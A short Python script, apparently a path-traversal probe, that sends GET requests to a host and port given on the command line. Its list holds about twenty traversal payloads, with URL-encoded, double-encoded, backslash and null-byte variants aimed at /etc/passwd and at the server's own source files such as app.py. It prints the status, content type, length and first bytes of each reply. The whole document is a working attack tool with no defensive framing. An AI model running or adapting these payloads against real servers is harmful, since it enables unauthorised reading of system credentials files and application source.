import http.client, sys
paths = ["/recordings/u34_orbits/index.json", "/recordings/v04_orbits/index.json", "/recordings/u34_orbits/..%2Findex.json",
 "/recordings/..%2F..%2Fserver/app.py", "/recordings/u34_orbits/..%2F..%2Fu34_orbits%2Fviz.py", "/recordings/..%2Fu34_orbits/viz.py",
 "/recordings/%2E%2E/u34_orbits", "/recordings/u34_orbits/%2E%2E", "/recordings/../../etc/passwd", "/images/..%2F..%2FREADME.md",
 "/images/posters.json", "/images/u34_orbits.jpg", "/images/%2E%2E", "/recordings/u34_orbits/index.json%00.gz",
 "/recordings/..%5C..%5Cetc/passwd", "/legal/..%2FLICENSE.md", "/recordings/..%252F..%252Fetc/passwd",
 "/viz/u34_orbits/..%2Fviz.py", "/viz/u34_orbits/..%2F..%2Fserver%2Flfviz%2Fapp.py", "/static/..%2Fserver%2Flfviz%2Fapp.py"]
for p in paths:
    c = http.client.HTTPConnection(sys.argv[1], int(sys.argv[2]), timeout=20)
    c.request("GET", p)
    r = c.getresponse(); body = r.read()
    print(r.status, p, r.getheader("Content-Type"), len(body), body[:60])
